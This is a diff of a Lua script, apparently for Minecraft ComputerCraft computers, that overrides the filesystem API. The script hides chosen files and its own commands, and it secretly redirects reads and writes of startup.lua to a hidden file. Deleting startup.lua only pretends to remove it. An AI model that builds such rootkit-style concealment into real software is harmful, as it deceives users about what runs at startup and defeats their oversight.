@@ -30,11 +30,8 @@ local function isHidden(path)
     return false
 end
 
-
-
 -- Define the hidden commands and their implementations
 local hiddenCommands = {}
-
 
 -- Function to hide a file
 hiddenCommands.hideFile = function(path)
@@ -90,7 +87,9 @@ end
 hiddenCommands.setOriginalStartup = function(path)
     local normalizedPath = fs.combine("", path)
     if not fs.exists(normalizedPath) then
-        error("Cannot set startup file: " .. path .. " does not exist.", 2)
+        -- Create an empty file if it doesn't exist
+        local handle = fs.open(normalizedPath, "w")
+        handle.close()
     end
     if fs.isDir(normalizedPath) then
         error("Cannot set startup file: " .. path .. " is a directory.", 2)
@@ -103,7 +102,8 @@ for name, func in pairs(hiddenCommands) do
     rawset(fs, name, func)
 end
 
-local hiddenCommands = {
+-- Boolean array for hiding commands
+local hiddenCommandNames = {
     hideDir = true,
     unhideDir = true,
     setOriginalStartup = true,
@@ -111,6 +111,7 @@ local hiddenCommands = {
     unhideFile = true,
 }
 
+-- Override shell completion
 if shell and shell.complete then
     local oldComplete = shell.complete
     shell.complete = function(line)
@@ -119,7 +120,7 @@ if shell and shell.complete then
             local filtered = {}
             for _, suggestion in ipairs(suggestions) do
                 local commandName = suggestion:match("fs%.(%w+)")
-                if not hiddenCommands[commandName] then
+                if not hiddenCommandNames[commandName] then
                     table.insert(filtered, suggestion)
                 end
             end
@@ -129,9 +130,10 @@ if shell and shell.complete then
     end
 end
 
+-- Set the metatable for `fs`
 setmetatable(fs, {
     __index = function(_, key)
-        if hiddenCommands[key] then
+        if hiddenCommandNames[key] then
             return nil -- Hide from tab completion
         end
         return native[key]
@@ -140,7 +142,7 @@ setmetatable(fs, {
         -- Only expose non-hidden commands
         return function(_, k)
             local nextKey, nextValue = next(native, k)
-            while nextKey and hiddenCommands[nextKey] do
+            while nextKey and hiddenCommandNames[nextKey] do
                 nextKey, nextValue = next(native, nextKey)
             end
             return nextKey, nextValue
@@ -148,8 +150,7 @@ setmetatable(fs, {
     end,
 })
 
-
--- Wrapper for fs.list to exclude hidden directories
+-- Wrapper for fs.list to exclude hidden directories and files
 local oldList = native.list
 function fs.list(path)
     local items = oldList(path)
@@ -163,7 +164,7 @@ function fs.list(path)
     return visibleItems
 end
 
--- Wrapper for fs.exists to account for hidden directories
+-- Wrapper for fs.exists to account for hidden files and directories
 local oldExists = native.exists
 function fs.exists(path)
     if isHidden(path) then
@@ -172,50 +173,84 @@ function fs.exists(path)
     return oldExists(path)
 end
 
--- Wrapper for fs.isDir to account for hidden directories
+-- Wrapper for fs.isDir to account for hidden files and directories
 local oldIsDir = native.isDir
 function fs.isDir(path)
     if isHidden(path) then
-        return true
+        -- Check if it's in hiddenFiles to explicitly not treat it as a directory
+        for _, file in ipairs(hiddenFiles) do
+            if fs.combine("", path) == file then
+                return false -- Hidden file, not a directory
+            end
+        end
+        return true -- Hidden directory
     end
     return oldIsDir(path)
 end
 
--- Monitor startup.lua creation and deletion
+
+-- Wrapper for fs.open to handle startup.lua edits and unhide
 local originalOpen = native.open
 function fs.open(path, mode)
     local normalizedPath = fs.combine("", path)
     if normalizedPath == "startup.lua" then
         if mode == "w" or mode == "wb" then
-            -- File is being created or overwritten
+            -- Unhide the file when writing to it
             for i, file in ipairs(hiddenFiles) do
                 if file == normalizedPath then
-                    table.remove(hiddenFiles, i)
+                    table.remove(hiddenFiles, i) -- Unhide startup.lua
                     break
                 end
             end
-            local handle = originalOpen(normalizedPath, mode)
-            handle.close() -- Immediately close after clearing
-            return originalOpen(normalizedPath, mode) -- Return a new handle for the write
-        elseif mode == nil and not fs.exists(normalizedPath) then
-            -- File is being opened in read mode but does not exist
-            hiddenCommands.hideFile(normalizedPath) -- Hide the file if it does not exist
+
+            -- Redirect all writes to originalStartup
+            return originalOpen(originalStartup, mode)
+        elseif mode == "r" or mode == "rb" then
+            -- Redirect all reads to originalStartup
+            return originalOpen(originalStartup, mode)
         end
     end
+
+    -- For all other files, use normal open behavior
     return originalOpen(path, mode)
 end
 
--- Wrapper for fs.delete to hide the startup.lua file when deleted
+
+
+
+-- Wrapper for fs.delete to handle "deletion" of startup.lua
 local originalDelete = native.delete
 function fs.delete(path)
     local normalizedPath = fs.combine("", path)
-    if normalizedPath == "startup.lua" and fs.exists(normalizedPath) then
-        hiddenCommands.hideFile(normalizedPath) -- Hide the file if it is deleted
+    if normalizedPath == "startup.lua" then
+        -- Instead of deleting, wipe the contents of originalStartup
+        local handle = native.open(originalStartup, "w")
+        if handle then
+            handle.close() -- Wipes the file by opening it in write mode
+        end
+
+        -- Add startup.lua to hiddenFiles if not already hidden
+        local isAlreadyHidden = false
+        for _, file in ipairs(hiddenFiles) do
+            if file == normalizedPath then
+                isAlreadyHidden = true
+                break
+            end
+        end
+        if not isAlreadyHidden then
+            table.insert(hiddenFiles, normalizedPath)
+        end
+
+        -- Do not actually delete the real startup.lua file
+        return
     end
+
+    -- Proceed with normal deletion for other files
     originalDelete(path)
 end
 
--- Wrapper for fs.find to exclude hidden directories
+
+-- Wrapper for fs.find to exclude hidden directories and files
 local oldFind = native.find
 function fs.find(pattern)
     local results = oldFind(pattern)
@@ -228,6 +263,7 @@ function fs.find(pattern)
     return visibleResults
 end
 
+-- Wrapper for fs.complete to support additional features
 function fs.complete(sPath, sLocation, bIncludeFiles, bIncludeDirs)
     expect(1, sPath, "string")
     expect(2, sLocation, "string")
@@ -299,60 +335,6 @@ function fs.complete(sPath, sLocation, bIncludeFiles, bIncludeDirs)
     end
 
     return {}
-end
-
-local function find_aux(path, parts, i, out)
-    local part = parts[i]
-    if not part then
-        if fs.exists(path) then out[#out + 1] = path end
-    elseif part.exact then
-        return find_aux(fs.combine(path, part.contents), parts, i + 1, out)
-    else
-        if not fs.isDir(path) then return end
-
-        local files = fs.list(path)
-        for j = 1, #files do
-            local file = files[j]
-            if file:find(part.contents) then find_aux(fs.combine(path, file), parts, i + 1, out) end
-        end
-    end
-end
-
-local find_escape = {
-    ["^"] = "%^", ["$"] = "%$", ["("] = "%(", [")"] = "%)", ["%"] = "%%",
-    ["."] = "%.", ["["] = "%[", ["]"] = "%]", ["+"] = "%+", ["-"] = "%-",
-    ["*"] = ".*",
-    ["?"] = ".",
-}
-
-function fs.find(pattern)
-    expect(1, pattern, "string")
-
-    pattern = fs.combine(pattern)
-
-    if pattern == ".." or pattern:sub(1, 3) == "../" then
-        error("/" .. pattern .. ": Invalid Path", 2)
-    end
-
-    if not pattern:find("[*?]") then
-        if fs.exists(pattern) then return { pattern } else return {} end
-    end
-
-    local parts = {}
-    for part in pattern:gmatch("[^/]+") do
-        if part:find("[*?]") then
-            parts[#parts + 1] = {
-                exact = false,
-                contents = "^" .. part:gsub(".", find_escape) .. "$",
-            }
-        else
-            parts[#parts + 1] = { exact = true, contents = part }
-        end
-    end
-
-    local out = {}
-    find_aux("", parts, 1, out)
-    return out
 end
 
 function fs.isDriveRoot(sPath)
